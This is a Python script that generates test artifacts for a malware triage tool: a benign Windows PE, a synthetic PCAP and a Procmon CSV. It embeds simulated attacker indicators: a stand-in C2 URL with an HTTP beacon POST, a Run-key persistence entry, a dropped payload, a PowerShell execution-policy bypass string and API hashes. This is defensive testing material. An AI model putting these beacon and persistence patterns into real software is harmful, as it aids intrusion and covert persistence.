"""
Test Artifact Generator
Generates benign PE binaries with MinGW, simulated PCAP traffic,
and Procmon CSV logs for end-to-end testing of AutoSleuth-Triage.
"""
import subprocess
import csv
from pathlib import Path
from scapy.all import Ether, IP, UDP, TCP, DNS, DNSQR, DNSRR, Raw, wrpcap

from analyzers.static.api_hashing import hash_djb2, hash_ror13, hash_crc32, hash_fnv1a

TESTS_DIR = Path(__file__).resolve().parent

def generate_benign_pe():
    """Compiles a benign Windows PE binary with simulated malware characteristics using MinGW."""
    pe_path = TESTS_DIR / "sample_benign_triage.exe"
    c_source = TESTS_DIR / "sample_source.c"

    # Pre-calculate API hashes to embed in binary
    h_valloc_djb2 = hash_djb2("VirtualAlloc")
    h_cproc_ror13 = hash_ror13("CreateProcessA")
    h_loadlib_crc = hash_crc32("LoadLibraryA")
    h_wsa_fnv = hash_fnv1a("WSAStartup")

    c_code = f"""
#include <windows.h>
#include <stdio.h>

// Simulated API hash table (as used in Maldev Module 55)
const unsigned int g_ApiHashes[] = {{
    0x{h_valloc_djb2:08X}, // djb2: VirtualAlloc
    0x{h_cproc_ror13:08X}, // ROR13: CreateProcessA
    0x{h_loadlib_crc:08X}, // CRC32: LoadLibraryA
    0x{h_wsa_fnv:08X}      // FNV-1a: WSAStartup
}};

// Simulated suspicious strings
const char* g_C2_URL = "http://malicious-c2.test/gate.php";
const char* g_RegPath = "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
const char* g_CmdPayload = "powershell.exe -ExecutionPolicy Bypass -Command Write-Host Triage";

__declspec(dllexport) void TriageTestExport(void) {{
    printf("[*] AutoSleuth Triage Sample Export Executed.\\n");
}}

int main() {{
    printf("[*] Benign Triage Verification Sample\\n");
    printf("[*] Target C2: %s\\n", g_C2_URL);
    printf("[*] Target Registry: %s\\n", g_RegPath);
    printf("[*] Hash Count: %zu\\n", sizeof(g_ApiHashes)/sizeof(g_ApiHashes[0]));
    return 0;
}}
"""
    with open(c_source, "w") as f:
        f.write(c_code)

    # Compile using MinGW cross-compiler
    compiler = "x86_64-w64-mingw32-gcc"
    cmd = [compiler, "-o", str(pe_path), str(c_source), "-s"]
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        print(f"[+] Compiled test PE binary: {pe_path}")
    except Exception as e:
        print(f"[-] Compilation failed: {e}")
        # If compiler fails, write mock PE header bytes
        with open(pe_path, "wb") as f:
            f.write(b"MZ" + b"\x00"*58 + b"\x80\x00\x00\x00" + b"\x00"*60 + b"PE\x00\x00")

    return pe_path


def generate_synthetic_pcap():
    """Generates a synthetic PCAP trace with DNS lookups and HTTP beacons using Scapy."""
    pcap_path = TESTS_DIR / "sample_traffic.pcap"
    packets = []

    # Packet 1: DNS Query for malicious-c2.test
    eth = Ether(src="00:0c:29:ab:cd:ef", dst="00:50:56:11:22:33")
    ip_dns = IP(src="192.168.1.105", dst="8.8.8.8")
    udp_dns = UDP(sport=53123, dport=53)
    dns_req = DNS(id=0x1337, qr=0, qd=DNSQR(qname="malicious-c2.test"))
    packets.append(eth / ip_dns / udp_dns / dns_req)

    # Packet 2: DNS Response
    ip_dns_resp = IP(src="8.8.8.8", dst="192.168.1.105")
    udp_dns_resp = UDP(sport=53, dport=53123)
    dns_resp = DNS(id=0x1337, qr=1, qd=DNSQR(qname="malicious-c2.test"), an=DNSRR(rrname="malicious-c2.test", rdata="198.51.100.45"))
    packets.append(eth / ip_dns_resp / udp_dns_resp / dns_resp)

    # Packet 3: HTTP POST Beacon to 198.51.100.45:80
    ip_http = IP(src="192.168.1.105", dst="198.51.100.45")
    tcp_http = TCP(sport=49152, dport=80, flags="PA", seq=100, ack=100)
    http_payload = (
        b"POST /gate.php HTTP/1.1\r\n"
        b"Host: malicious-c2.test\r\n"
        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AutoSleuth-Beacon/1.0\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 28\r\n\r\n"
        b"hwid=DESKTOP-TEST&status=init"
    )
    packets.append(eth / ip_http / tcp_http / Raw(load=http_payload))

    wrpcap(str(pcap_path), packets)
    print(f"[+] Generated synthetic PCAP trace: {pcap_path}")
    return pcap_path


def generate_synthetic_procmon_csv():
    """Generates a Procmon CSV log representing file drop and registry persistence."""
    csv_path = TESTS_DIR / "sample_procmon.csv"
    headers = ["Time of Day", "Process Name", "PID", "Operation", "Path", "Result", "Detail"]
    rows = [
        ["14:32:01.123", "sample_benign_triage.exe", "4092", "CreateFile", "C:\\Users\\Analyst\\AppData\\Local\\Temp\\dropped_payload.exe", "SUCCESS", "Desired Access: Generic Write, Disposition: Create"],
        ["14:32:01.145", "sample_benign_triage.exe", "4092", "WriteFile", "C:\\Users\\Analyst\\AppData\\Local\\Temp\\dropped_payload.exe", "SUCCESS", "Offset: 0, Length: 32768, Priority: Normal"],
        ["14:32:01.210", "sample_benign_triage.exe", "4092", "RegCreateKey", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SUCCESS", "Desired Access: Set Value"],
        ["14:32:01.215", "sample_benign_triage.exe", "4092", "RegSetValue", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinSecurityUpdate", "SUCCESS", "Type: REG_SZ, Length: 120, Data: C:\\Users\\Analyst\\AppData\\Local\\Temp\\dropped_payload.exe"],
        ["14:32:01.300", "sample_benign_triage.exe", "4092", "Process Create", "C:\\Windows\\System32\\cmd.exe", "SUCCESS", "PID: 4980, Command line: cmd.exe /c whoami /all"]
    ]

    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(headers)
        writer.writerows(rows)

    print(f"[+] Generated synthetic Procmon CSV log: {csv_path}")
    return csv_path


if __name__ == "__main__":
    generate_benign_pe()
    generate_synthetic_pcap()
    generate_synthetic_procmon_csv()
    print("[✔] All test artifacts created successfully.")
